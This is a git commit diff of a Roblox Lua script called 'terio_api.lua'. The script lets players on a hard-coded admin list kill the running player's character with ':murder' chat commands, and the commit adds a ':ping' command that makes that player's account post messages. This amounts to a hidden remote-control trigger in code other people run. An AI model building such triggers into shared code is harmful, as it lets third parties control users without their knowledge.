b0ffebc87c3faafa25141f95860005e24455a4f3
teriotheh <terionew@outlook.com>
2025-05-02 00:36:26 +0200

    Update terio_api.lua

--- terio_api.lua
+++ terio_api.lua
@@ -1,14 +1,29 @@
+     function Chat(msg)
+   if game.ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+       game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+   else
+       game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
+   end
+end
 local adminlist = {"BrillifulPigeon", "ReverbArgalia", "azuresfrie_nd", "teriothej"}
 for i,plr in pairs(game.Players:GetPlayers()) do
    plr.Chatted:Connect(function(msg)
-       if table.find(adminlist, plr.Name) and string.find(msg, ":murder") then
+if table.find(adminlist, plr.Name) and string.find(msg, ":murder") then
 		   if string.find(msg, game.Players.LocalPlayer.Name) then
 			   game.Players.LocalPlayer.Character.Humanoid.Health = 0
 		    elseif string.find(msg, "others") then
                         if not table.find(adminlist, game.Players.LocalPlayer.Name)  then
                            game.Players.LocalPlayer.Character.Humanoid.Health = 0
-			end
-		   end
-       end
+			            end
+		     end
+elseif table.find(adminlist, plr.Name) and string.find(msg, ":ping") then
+		   if string.find(msg, game.Players.LocalPlayer.Name) then
+			   Chat("@PINGED!")
+		    elseif string.find(msg, "others") then
+                        if not table.find(adminlist, game.Players.LocalPlayer.Name)  then
+                           Chat("@PINGED!")
+			            end
+		     end
+end
    end)
 end
